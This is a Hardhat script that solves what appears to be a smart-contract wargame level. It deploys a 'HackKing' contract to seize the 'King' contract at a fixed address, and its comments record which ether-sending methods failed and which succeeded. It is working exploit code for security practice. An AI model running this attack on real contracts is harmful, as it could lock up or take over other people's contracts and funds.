// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "King";
  const contractAddress = "0x7C26D61466EBfaAe091FeE0d18B7f86C1C3D9db6";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  hacker = tester;
  console.log(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 📕 Deploy the contract that will execute the hack
  const HackKing = await ethers.getContractFactory("HackKing", hacker);
  const hackKing = await HackKing.connect(hacker).deploy(contract.address);
  await hackKing.deployed();
  console.log(`📕 HackKing address:\n ${hackKing.address} \n`);

  // 👿 Hacking the contract
  // 🗣 Logging status
  let king = await contract._king();
  let prize = await contract.prize();
  prize = ethers.utils.formatEther(prize);
  console.log("👑 Initial king:", king);
  console.log("💰 Initial prize:", prize, " ether\n");

  // 📕 Execute the hack with from EOA
  // sendTransaction(. . .)  ❌ - we don't block the transfer back
  if (false) {
    txSendTransaction = await hacker.sendTransaction({
      to: contract.address,
      value: ethers.utils.parseEther(prize),
      // gasLimit: 1000000,
    });
    await txSendTransaction.wait((confirms = 1));

    // 🗣 Logging status
    king = await contract._king();
    prize = await contract.prize();
    prize = ethers.utils.formatEther(prize);
    console.log("👑 Current king:", king);
    console.log("💰 Current prize:", prize, " ether\n");
  }

  // 📕 Execute the hack with
  // selfdestruct(. . .)  ❌ - not calling receive
  // sendEther(. . .)     ❌ - not enough gas when executing receive
  // transferEther(. . .) ❌ - not enough gas when executing receive
  if (false) {
    const txCallValue = await hackKing.selfDestructEther({
      value: ethers.utils.parseEther(prize),
      // gasLimit: 1000000,
    });
    await txCallValue.wait((confirms = 1));

    // 🗣 Logging status
    king = await contract._king();
    prize = await contract.prize();
    prize = ethers.utils.formatEther(prize);
    console.log("👑 Current king:", king);
    console.log("💰 Current prize:", prize, " ether\n");
  }

  // 📕 Execute the hack with callValueEther(_kingAddress)  ✅
  if (true) {
    const txCallValue = await hackKing.callValueEther({
      value: ethers.utils.parseEther(prize),
      gasLimit: 1000000,
    });
    await txCallValue.wait((confirms = 1));

    // 🗣 Logging status
    king = await contract._king();
    prize = await contract.prize();
    prize = ethers.utils.formatEther(prize);
    console.log("👑 Current king:", king);
    console.log("💰 Current prize:", prize, " ether\n");
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
